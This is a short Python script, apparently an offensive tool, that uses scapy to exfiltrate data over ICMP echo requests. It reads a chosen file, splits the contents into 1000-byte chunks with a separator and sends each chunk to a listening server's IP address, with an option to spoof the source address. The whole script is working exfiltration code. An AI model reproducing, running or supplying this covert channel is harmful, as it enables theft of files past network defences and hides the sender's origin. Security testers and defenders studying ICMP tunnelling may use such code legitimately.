import mmap
import argparse
from scapy.all import send, IP, ICMP

def send_icmp_echo_request(target_ip: str, payload: str, src_ip: str = None):
    if src_ip:
        packet = IP(dst=target_ip, src=src_ip)/ICMP(type=8)/payload
    else:
        packet = IP(dst=target_ip)/ICMP(type=8)/payload
    send(packet)
    print(f"Sent ICMP Echo Request to {target_ip} with payload: {payload}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Data exfiltration via ICMP Echo Request")
    parser.add_argument("-t", "--target", type=str, required=True, help="IP address where you have the server listening")
    parser.add_argument("-d", "--data", type=str, required=False, help="Data to send in the ICMP payload")
    parser.add_argument("-f", "--file", type=str, required=False, help="File to read data from and send in the ICMP payload")
    parser.add_argument("-s", "--separator", type=str, default="-:-", help="Separator for chunked data")
    parser.add_argument("--src", type=str, required=False, help="Source IP address for the ICMP packet")
    
    args = parser.parse_args()

    if not args.data and not args.file:
        parser.error("At least one of --data or --file must be provided.")

    target = args.target
    data = args.data
    file_path = args.file
    file_data = b""
    if file_path:
        with open(file_path, "r+b") as f:
            mm = mmap.mmap(f.fileno(), 0)
            for line in iter(mm.readline, b""):
                file_data += line
            mm.close()

    if len(file_data) > 1000:
        payloads = [file_data[i:i+1000] for i in range(0, len(file_data), 1000)]
        for payload in payloads:
            if payload != payloads[-1]:
                send_icmp_echo_request(target, args.separator + payload.decode(errors='ignore'), src_ip=args.src if args.src else None)
            else:
                send_icmp_echo_request(target, payload.decode(errors='ignore'), src_ip=args.src if args.src else None)
    else:
        send_icmp_echo_request(target, file_data.decode(errors='ignore') if file_data else data, src_ip=args.src if args.src else None)
